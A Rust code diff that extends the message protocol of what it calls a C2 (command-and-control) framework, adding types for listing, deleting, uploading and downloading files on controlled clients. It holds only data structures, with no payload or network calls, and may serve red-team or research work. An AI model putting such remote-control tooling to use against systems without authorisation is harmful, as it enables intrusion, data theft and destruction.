@@ -1,5 +1,7 @@
 use chrono::{DateTime, Utc};
 use serde::{Deserialize, Serialize};
+use std::path::PathBuf;
+use std::time::SystemTime;
 use uuid::Uuid;
 
 /// C2 framework message structure
@@ -30,8 +32,18 @@ pub enum MessageType {
     FileTransfer,
     /// System information
     SystemInfo,
+    /// List directory contents
+    ListDir,
+    /// Delete file or directory
+    DeletePath,
+    /// Upload file
+    UploadFile,
+    /// Download file
+    DownloadFile,
     /// Error message
     Error,
+    /// Response to a file operation
+    FileOperationResponse,
 }
 
 /// Client information structure
@@ -90,6 +102,67 @@ pub struct ShellData {
     pub timestamp: DateTime<Utc>,
 }
 
+/// File entry structure for listing directories
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct FileEntry {
+    pub name: String,
+    pub path: PathBuf,
+    pub is_dir: bool,
+    pub size: Option<u64>,
+    pub modified: Option<SystemTime>,
+    pub permissions: Option<String>,
+}
+
+/// Request to list directory contents on the client
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ListDirRequest {
+    pub path: String,
+    pub recursive: bool,
+}
+
+/// Response for listing directory contents on the client
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ListDirResponse {
+    pub entries: Vec<FileEntry>,
+    pub success: bool,
+    pub message: String,
+}
+
+/// Request to delete a path on the client
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct DeletePathRequest {
+    pub path: String,
+}
+
+/// Response for deleting a path on the client
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct DeletePathResponse {
+    pub success: bool,
+    pub message: String,
+}
+
+/// Request to download a file from the client
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct DownloadFileRequest {
+    pub path: String,
+}
+
+/// Chunk of data for file download/upload
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct FileChunk {
+    pub file_id: String,
+    pub chunk: Vec<u8>,
+    pub is_last: bool,
+    pub offset: u64, // Add offset for resuming/ordering chunks
+}
+
+/// Request to upload a file to the client
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct UploadFileRequest {
+    pub path: String,
+    pub file_id: String,
+}
+
 /// Implementation of methods for ShellData
 impl ShellData {
     pub fn new(session_id: String, data: Vec<u8>) -> Self {
@@ -118,5 +191,11 @@ impl Message {
 
     pub fn from_json(json: &str) -> Result<Self, serde_json::Error> {
         serde_json::from_str(json)
+    }
+}
+
+impl std::fmt::Display for MessageType {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "{:?}", self)
     }
 }
